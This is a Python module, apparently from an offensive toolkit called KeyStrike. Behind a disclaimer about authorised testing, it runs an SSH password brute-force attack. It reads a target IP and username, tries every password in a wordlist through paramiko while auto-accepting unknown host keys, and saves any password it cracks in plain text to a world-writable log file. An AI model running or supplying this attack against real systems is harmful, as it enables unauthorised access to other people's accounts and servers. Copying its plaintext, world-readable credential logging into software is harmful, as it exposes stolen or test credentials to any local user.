"""
DISCLAIMER:
This tool is intended **strictly for educational and authorized testing purposes only**.
You must obtain **explicit permission** from the owner of any system you target with this script.
Unauthorized access or misuse of this tool **may be illegal** and can result in **criminal charges**.

The developer and contributors of KeyStrike **are not responsible** for any misuse or damage caused.
Use responsibly and ethically.
"""
import paramiko
import os
from utils.colors import color_text

def run():
    print(color_text("\n[+] Starting SSH Brute Force...\n", "cyan"))
    
    host = input("Enter SSH server IP address: ")
    username = input("Enter username to test: ")

    try:
        with open("wordlist.txt", "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                password = line.strip()
                try:
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(host, username=username, password=password, timeout=5, banner_timeout=3)

                    print(color_text(f"[SUCCESS] Password found: {password}", "green"))

                    if not os.path.exists("success_log.txt"):
                        with open("success_log.txt", "w") as temp:
                            pass
                        os.chmod("success_log.txt", 0o666)


                    with open("success_log.txt", "w") as log:
                        log.write(f"Target: {host}\nUsername: {username}\nPassword: {password}\n")

                    ssh.close()
                    return
                except paramiko.AuthenticationException:
                    pass
                except paramiko.SSHException as e:
                    print(color_text(f"[!] SSH Error: {e}", "red"))
                    break
                except Exception as e:
                    print(color_text(f"[!] Error: {e}", "red"))
                    break
    except FileNotFoundError:
        print(color_text("[-] wordlist.txt not found!", "red"))
    except PermissionError:
        print(color_text("[-] wordlist.txt is not readable.", "red"))
